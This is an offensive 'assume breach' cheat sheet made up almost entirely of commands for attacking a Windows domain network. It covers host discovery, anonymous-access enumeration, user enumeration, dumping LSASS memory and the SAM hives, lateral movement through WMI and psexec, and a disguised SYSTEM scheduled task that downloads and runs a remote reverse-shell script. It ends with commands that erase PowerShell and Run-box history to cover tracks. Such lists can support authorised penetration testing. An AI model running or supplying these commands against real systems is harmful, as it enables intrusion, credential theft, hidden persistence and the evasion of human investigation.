# ASSUME BREACH REFERENCE
############################################
# 1  NETWORK DISCOVERY                     #
############################################
# PING SWEEP?  (edit subnet)               
```bash
nmap -sn 10.0.0.0/24 -oG ping_sweep
```

# EXTRACT LIVE IPS? (→ online)
#NOTE: Not ALL of these will always be real online machines. Some will be bogus ICMP returns...it just happens sometimes. Gather the local domain from the internal and grep for that in addition to any returned MAC Addresses. Basically, this is a situational thing when getting your actual "online" flat-file. 
In bash terms: 
```bash
|grep -iE 'mac|<domain>.local' -B2 |grep -oE '((1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.){3}(1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])' |sort -u > online
```
In basic terms:            
```bash
cat ping_sweep |grep -oE '((1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.){3}(1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])' | sort -u > online
```

# TOP‑100 PORT SCAN?                       
```bash
for ip in $(cat online); do nmap -sS -Pn --top-ports 100 -oA "quick_$ip" "$ip"; done
```

# FULL TCP (optional)?                     
```bash
sudo nmap -sS -p- -T4 -iL online -oA full_scan
```

############################################
# 1A  NULL / ANON AUTH CHECKS              #
############################################
# SMB NULL SESSION?  (→ smb_null.txt)      
```bash
for ip in $(cat online); do smbclient -L "//$ip/" -N -g >/dev/null 2>&1 && echo $ip; done | tee smb_null.txt
```

# RPC NULL INFO?  (→ rpc_null.txt)         
```bash
for ip in $(cat online); do rpcclient -U "" -N "$ip" -c info 2>&1 | grep -q 'Domain' && echo $ip; done | tee rpc_null.txt
```

# LDAP ANON BIND?  (→ ldap_anon.txt)       
```bash
for ip in $(cat online); do ldapsearch -x -H "ldap://$ip" -s base -b "" -o nettimeout=3 "(objectclass=*)" 2>/dev/null | head -n1 | grep -q "namingContexts" && echo $ip; done | tee ldap_anon.txt
```

# NFS EXPORTS?  (→ nfs_exports.txt)        
```bash
for ip in $(cat online); do showmount -e "$ip" 2>/dev/null | grep -q "export list" && echo $ip; done | tee nfs_exports.txt
```

# SNMP PUBLIC STRING?  (→ snmp_public.txt) 
```bash
for ip in $(cat online); do snmpwalk -v2c -c public -t1 -r0 "$ip" 1.3.6.1.2.1.1.1.0 2>/dev/null | grep -q "DESCRIPTION" && echo $ip; done | tee snmp_public.txt
```

# FTP ANON LOGIN?  (→ ftp_anon.txt)        
```bash
for ip in $(cat online); do nmap -p21 --script ftp-anon -Pn "$ip" 2>/dev/null | grep -q "Anonymous FTP login allowed" && echo $ip; done | tee ftp_anon.txt
```

############################################
# 1B  NETEXEC & KERBRUTE ENUM              #
############################################
# NETEXEC SMB SHARE ENUM?  (→ ne_smb.txt)
```bash
netexec smb online -u '' -p '' --shares | tee ne_smb.txt
```

# NETEXEC SMB GUEST ENUM? (→ ne_smb_guest.txt)
```bash
netexec smb online -u "guest" -p "" --shares |tee ne_smb_guest.txt
```

# NETEXEC LDAP ENUM?  (→ ne_ldap.txt)      
```bash
netexec ldap online -u '' -p '' -M enum |tee ne_ldap.txt
```

# NETEXEC WINRM ENUM? (→ ne_winrm.txt)     
```bash
netexec winrm online -u '' -p '' --exec whoami |tee ne_winrm.txt
```

# NETEXEC MSSQL INFO? (→ ne_mssql.txt)     
```bash
netexec mssql online -u '' -p '' |tee ne_mssql.txt
```

# KERBRUTE USER ENUM? (→ kerbrute_valid.txt)
```bash
kerbrute userenum --dc <dc_ip> -d <domain> users.txt 2>/dev/null |tee kerbrute_valid.txt
```

############################################
# 2  CREDENTIAL DUMPING                    #
############################################
# LSASS MINIDUMP?                           
```powershell
rundll32.exe C:\\windows\\System32\\comsvcs.dll,MiniDump $(pidof lsass.exe) lsass.dmp full
```

# SAM+SYSTEM HIVES?                         
```powershell
reg save HKLM\SAM sam.save & reg save HKLM\SYSTEM system.save
```

# PARSE SECRETS?                            
```bash
secretsdump.py -sam sam.save -system system.save LOCAL > hashed.txt
```

############################################
# 3  LATERAL MOVEMENT                      #
############################################
# PS REMOTING?                              
```powershell
Enter-PSSession -ComputerName <host> -Credential <dom\\user>
```

# WMI EXEC?                                 
```powershell
wmic /node:<host> process call create "cmd /c powershell -c <payload>"
```

# SMB PSEXEC?                               
```bash
psexec.py <dom>/<user>:<pass>@<host>
```

############################################
# 4  PERSISTENCE                           #
############################################
# SYSTEM SCHEDULED TASK?                    
```powershell
schtasks /create /ru SYSTEM /sc ONSTART /tn WinUpdate /tr "powershell -ep bypass -c iex((New-Object Net.WebClient).DownloadString('http://<ip>/rev.ps1'))"
```

# WMI EVENT SUB BACKDOOR?                   
```powershell
powershell -c "Invoke-WmiMethod -Namespace root\subscription ..."
```

############################################
# 5  CLEAN-UP / COVER TRACKS               #
############################################
# CLEAR POWERSHELL HISTORY?                 
```powershell
Remove-Item (Get-PSReadlineOption).HistorySavePath
```

# CLEAR CMD RUNMRU?                         
```powershell
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
```
########################################################